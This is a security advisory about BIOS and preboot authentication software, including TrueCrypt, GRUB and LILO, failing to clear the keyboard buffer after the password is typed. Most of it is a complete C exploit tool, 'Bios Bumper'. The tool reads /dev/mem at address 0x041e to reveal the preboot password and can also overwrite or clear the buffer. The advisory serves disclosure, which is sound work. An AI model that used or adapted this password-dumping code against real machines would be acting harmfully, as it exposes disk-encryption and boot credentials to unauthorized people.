// source: https://www.securityfocus.com/bid/15751/info

Multiple vendors fail to clear the BIOS (Basic Input-Output System) keyboard buffer after reading the preboot authentication password during the system startup process.

Depending on the operating system running on affected computers, the memory region may or may not be available for user-level access. With Linux operating systems, superuser access is required. With Microsoft Windows operating systems, nonprivileged users may access the keyboard buffer region.

Attackers who obtain the password used for preboot authentication may then use it for further attacks.

UPDATE: Reportedly, the BIOS API calls and the BIOS keyboard buffer are used by various preboot authentication applications to read a password from the keyboard in an insecure manner. These applications are also vulnerable to this issue.

This issue is reported to affect the following software:

- Truecrypt 5.0 for Windows
- DiskCryptor 0.2.6 for Windows and prior
- Secu Star DriveCrypt Plus Pack v3.9 and prior
- Grub Legacy (GNU GRUB 0.97) and prior
- Lilo 22.6.1 and prior versions
- Award BIOS Modular 4.50pg
- Insyde BIOS V190
- Intel Corp BIOS PE94510M.86A.0050.2007.0710.1559 (07/10/2007)
- Hewlett-Packard BIOS 68DTT Ver. F.0D (11/22/2005)
- IBM Lenovo BIOS 7CETB5WW v2.05 (10/13/2006)

#define BIOS_PWD_ADDR 0x041e

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/uio.h>

struct dumpbuff
{
char tab[32];
};

int dump_bios_pwd(void)
{
char tab[32];
char tab2[16];
int fd,a,i,j;

fd = open("/dev/mem", "r");

if(fd == -1)
{
printf("cannot open /dev/mem");
return 1;
}

a=lseek(fd,BIOS_PWD_ADDR,SEEK_SET);
a=read(fd, &tab, 32);
if(a<=0)
{
printf("cannot read /dev/mem");
return 1;
}

close(fd);

i=0;
for (j=0;j<16;j++)
{
tab2[i]=tab[2*j];
i++;
}

printf("\n\nPassword : ");
for (j=0;j<16;j++)
{
printf("%c",tab2[j]);

}

printf("\n");
return 0;

}

int clear_bios_pwd (void)
{

FILE *f;
struct dumpbuff b;
int i;
long j=1054;

for (i=0;i<32;i++)
{
b.tab[i]=' ';
}

f=fopen("/dev/mem","r+");
fseek(f,j,SEEK_SET);

fwrite (&b, sizeof(struct dumpbuff),1,f);
fclose(f);
printf("\n[Buffer Cleared]\n");
return 0;
}

int change_pwd()
{

FILE *f;
struct dumpbuff b;
int i;
long j=1054;
char pwd[18];
char crap;

//Ask Pwd...

printf("\n Enter new Pwd :\n(16 caratcters max)\n");

for (i=0;i<18;i++)
{
pwd[i]=' ';
}

scanf("%s%c",&pwd,&crap);

for (i=0;i<=15;i++)
{
b.tab[2*i]=pwd[i];
b.tab[2*i+1]=' ';
}

f=fopen("/dev/mem","r+");
fseek(f,j,SEEK_SET);

fwrite (&b, sizeof(struct dumpbuff),1,f);
printf("\n[Buffer Uptdated]\n");
fclose(f);

return 0;

}

int main(void)
{

char choiceval=0;
char crap;
char tab3[100];

printf(" _=�Bios Bumper�=_ \n\n\n");
printf(" (endrazine (at) pulltheplug (dot) org [email concealed]) \n");
printf(" by Endrazine\n");

while(choiceval !='x')
{
printf ("\n==============================\n");
printf("[Keyboard buffer manipulation]\n");
printf("==============================\n");
printf("\n 1 - Display Password\n");
printf(" 2 - Clear Keyboard Buffer\n");
printf(" 3 - Enter new Password\n");
printf("\n==============================\n");
printf("\n x - Quit\n");

scanf("%c%c",&choiceval,&crap);

if (choiceval=='1')
dump_bios_pwd();

if (choiceval=='2')
clear_bios_pwd();

if (choiceval=='3')
change_pwd();

}
return 0;
}